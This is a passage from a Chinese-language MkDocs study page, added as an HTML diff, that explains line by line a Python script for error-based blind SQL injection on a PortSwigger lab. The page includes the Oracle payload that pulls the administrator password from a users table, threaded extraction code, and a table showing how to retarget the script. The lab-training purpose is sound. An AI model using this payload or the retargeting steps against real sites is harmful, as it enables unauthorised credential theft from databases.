+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="mi">125</span>     <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">[*] 通道正常,开始二分爆破...</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>自检不过 → 退出码 2，一步都不往下走。</strong></p>
+<h3 id="127132">127–132 行：准备并行<a class="headerlink" href="#127132" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="mi">127</span>     <span class="n">chars</span> <span class="o">=</span> <span class="p">{</span><span class="n">p</span><span class="p">:</span> <span class="s2">"?"</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">PASSWORD_LEN</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)}</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="mi">128</span>     <span class="n">started</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="mi">129</span>     <span class="n">done</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="mi">131</span>     <span class="k">with</span> <span class="n">concurrent</span><span class="o">.</span><span class="n">futures</span><span class="o">.</span><span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="n">THREADS</span><span class="p">)</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="mi">132</span>         <span class="n">futures</span> <span class="o">=</span> <span class="p">{</span><span class="n">ex</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">find_char</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span> <span class="n">p</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">PASSWORD_LEN</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)}</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>行</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>127</strong></td>
+<td>结果字典，先全填 <code>?</code></td>
+</tr>
+<tr>
+<td><strong>128</strong></td>
+<td>记录开始时间</td>
+</tr>
+<tr>
+<td><strong>131</strong></td>
+<td>开线程池，最多 <code>THREADS</code> 个线程同时跑</td>
+</tr>
+<tr>
+<td><strong>132</strong></td>
+<td>每个位置提交一个任务；字典键是 <code>Future</code>、值是位置序号，便于反查</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>⭐ <strong>132 行是「并行粒度」。</strong> 若想改成「每 4 位一批」，把 <code>range</code> 改成 <code>range(1, LEN+1, 4)</code> 并让 <code>find_char</code> 处理范围。</p>
+</blockquote>
+<h3 id="133144">133–144 行：收集结果<a class="headerlink" href="#133144" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="mi">133</span>         <span class="k">for</span> <span class="n">fut</span> <span class="ow">in</span> <span class="n">concurrent</span><span class="o">.</span><span class="n">futures</span><span class="o">.</span><span class="n">as_completed</span><span class="p">(</span><span class="n">futures</span><span class="p">):</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="mi">134</span>             <span class="n">p</span> <span class="o">=</span> <span class="n">futures</span><span class="p">[</span><span class="n">fut</span><span class="p">]</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="mi">135</span>             <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="mi">136</span>                 <span class="n">ch</span> <span class="o">=</span> <span class="n">fut</span><span class="o">.</span><span class="n">result</span><span class="p">()</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="mi">137</span>                 <span class="n">chars</span><span class="p">[</span><span class="n">p</span><span class="p">]</span> <span class="o">=</span> <span class="n">ch</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="mi">138</span>                 <span class="n">done</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="mi">139</span>                 <span class="n">current</span> <span class="o">=</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">chars</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">PASSWORD_LEN</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="mi">140</span><span class="o">-</span><span class="mi">141</span>             <span class="nb">print</span><span class="p">(</span><span class="o">...</span><span class="p">)</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="mi">142</span><span class="o">-</span><span class="mi">144</span>         <span class="k">except</span> <span class="err">→</span> <span class="n">标记</span> <span class="s1">'?'</span> <span class="n">并打印失败</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>行</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>133</strong></td>
+<td><strong>谁先完成先处理谁</strong>（非顺序），所以输出顺序是乱的</td>
+</tr>
+<tr>
+<td><strong>134</strong></td>
+<td>反查这是第几位</td>
+</tr>
+<tr>
+<td><strong>136</strong></td>
+<td>取结果（任务抛过异常会在此重新抛出）</td>
+</tr>
+<tr>
+<td><strong>137</strong></td>
+<td>存入字典</td>
+</tr>
+<tr>
+<td><strong>139</strong></td>
+<td>拼出当前已知部分（未知仍是 <code>?</code>），便于观察进度</td>
+</tr>
+<tr>
+<td><strong>142–144</strong></td>
+<td>某位失败不影响其他位，标记 <code>?</code> 继续</td>
+</tr>
+</tbody>
+</table>
+<h3 id="146156">146–156 行：输出结果<a class="headerlink" href="#146156" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="mi">146</span>     <span class="n">password</span> <span class="o">=</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="o">...</span><span class="p">)</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="mi">149</span>     <span class="k">if</span> <span class="s2">"?"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">password</span><span class="p">:</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="mi">150</span><span class="o">-</span><span class="mi">152</span>     <span class="n">打印密码</span> <span class="o">+</span> <span class="n">用时</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="mi">153</span><span class="o">-</span><span class="mi">156</span> <span class="k">else</span><span class="p">:</span> <span class="n">打印未完成提示</span>
+</span></code></pre></div>
+<p><strong>149 行</strong>用「是否残留 <code>?</code>」判断成功与否 —— 简单可靠。</p>
+<h3 id="159160">159–160 行：入口<a class="headerlink" href="#159160" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="mi">159</span> <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="mi">160</span>     <span class="n">main</span><span class="p">()</span>
+</span></code></pre></div>
+<p><strong>直接运行才执行 <code>main()</code>；被 <code>import</code> 时不执行</strong>（所以才能只导入 <code>build_payload</code> 做测试）。</p>
+<hr />
+<h2 id="_4">十、改造速查表<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>要改什么</th>
+<th>改哪几行</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>目标地址 / 注入点初值</td>
+<td><strong>30、32</strong></td>
+</tr>
+<tr>
+<td>注入位置（Cookie → URL / POST / Header）</td>
+<td><strong>53</strong></td>
+</tr>
+<tr>
+<td>SQL 语句（表名、列名、函数）</td>
+<td><strong>44、45</strong></td>
+</tr>
+<tr>
+<td>判断依据（500 / Welcome back / 延时）</td>
+<td><strong>62</strong></td>
+</tr>
+<tr>
+<td>字符范围（只查 a-z0-9）</td>
+<td><strong>74</strong></td>
+</tr>
+<tr>
+<td>并发数 / 超时</td>
+<td><strong>34、35</strong></td>
+</tr>
+<tr>
+<td>多跑一列（username + password）</td>
+<td><strong>33</strong>（长度）+ <strong>44</strong>（列名），复制一次 <code>find_char</code> 循环</td>
+</tr>
+<tr>
+<td>换成时间盲注</td>
+<td><strong>62</strong> 改判断 <code>r.elapsed.total_seconds()</code></td>
+</tr>
+<tr>
+<td>换成布尔盲注（内容差异）</td>
+<td><strong>62</strong> 改判断页面特征字符串</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="_5">十一、常见问题<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<h3 id="q1-probe-true">Q1：为什么 <code>probe</code> 返回 <code>True</code> 表示「字符更大」？<a class="headerlink" href="#q1-probe-true" title="Permanent link">&para;</a></h3>
+<p>第 44 行问的是 <code>&gt; ascii_val</code>。条件为真 → 第 45 行执行 <code>to_char(1/0)</code> → 500 → 第 62 行返回 <code>True</code>。
+<strong>所以 <code>True</code> = 「字符码比 mid 大」。</strong></p>
+<h3 id="q2">Q2：自检过了但爆破结果全错？<a class="headerlink" href="#q2" title="Permanent link">&para;</a></h3>
+<p>八成是 <strong>第 44 行</strong> 的表名/列名与实际不符。用这条手工验证：</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="s1">'and(select case when(length(password)&gt;0) then to_char(1/0) else '</span><span class="n">a</span><span class="s1">' end from users where username='</span><span class="n">administrator</span><span class="s1">')='</span><span class="n">a</span><span class="err">'</span><span class="c1">--</span>
+</span></code></pre></div>
+<ul>
+<li><strong>能 500</strong> → 表和列都对，问题在别处</li>
+<li><strong>不 500</strong> → 表名或列名错了</li>
+</ul>
+<h3 id="q3-probe-failed">Q3：全是 <code>?</code> / 大量 <code>probe failed</code>？<a class="headerlink" href="#q3-probe-failed" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>原因</th>
+<th>处理</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>HTTP 504</strong>（网关超时）</td>
+<td><strong>lab 实例已过期</strong>。<code>portswigger.net</code> 能开但 lab 域名 504，就是这个原因。回 lab 页面点 <strong>Restart lab</strong>，拿到<strong>新 URL</strong> 和<strong>新 TrackingId</strong>，改第 30、32 行；<strong>密码也会变</strong>，第 33 行要重新测</td>
+</tr>
+<tr>
+<td>被限流</td>
+<td>第 34 行 <code>THREADS = 2</code></td>
+</tr>
+<tr>
+<td>网络慢</td>
+<td>第 35 行 <code>TIMEOUT = 30</code></td>
+</tr>
+<tr>
+<td>Lab 过期</td>
+<td>重开 lab，TrackingId 会变，改第 32 行</td>
+</tr>
+<tr>
+<td>代理干扰</td>
+<td>第 36 行 <code>VERIFY_SSL</code> 保持 <code>False</code>，检查系统代理</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>怎么区分"lab 过期"和"网络挂了"：</strong>
+打开 <code>https://portswigger.net/</code> —— 能开说明网络正常，那 lab 域名 504 就一定是实例被回收了。</p>
+</blockquote>
+<h3 id="q4">Q4：想同时跑多道题？<a class="headerlink" href="#q4" title="Permanent link">&para;</a></h3>
+<p>把配置区（第 30–36 行）改成参数，用 <code>argparse</code> 从命令行传入，<code>main()</code> 里接收即可。</p>
+<hr />
+<h2 id="payload">十二、附：payload 结构速记<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>{TRACKING}                  ← 第 32 行,原始注入值
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>'                           ← 第 43 行,闭合应用的字符串
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>and(select case when(
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>  ASCII(SUBSTR((SELECT password FROM users
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>                WHERE username='administrator'),pos,1)) &gt; N
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>) then to_char(1/0)         ← 第 44–45 行,真 → 崩
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>  else 'a' end from dual
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>)='a'                       ← 闭合子查询并与 'a' 比较
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>--                          ← 注释掉应用自带的收尾引号
+</span></code></pre></div>
+<p><strong>三个可变括弧:表名 / 列名 / 过滤条件。</strong>
+<strong>两类可变装置:判断真假的函数(44)、制造错误的函数(45)。</strong></p>
+<hr />
+<p><em>文档对应脚本版本：<code>blind_sqli_error.py</code>（160 行）。若脚本行号变化，以代码中的函数名为准（<code>build_payload</code> / <code>send</code> / <code>probe</code> / <code>find_char</code> / <code>sanity_check</code> / <code>main</code>）。</em></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      仅用于个人学习与授权测试记录
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../../assets/js/bg-video.js"></script>
+      
+    
+  </body>
+</html>
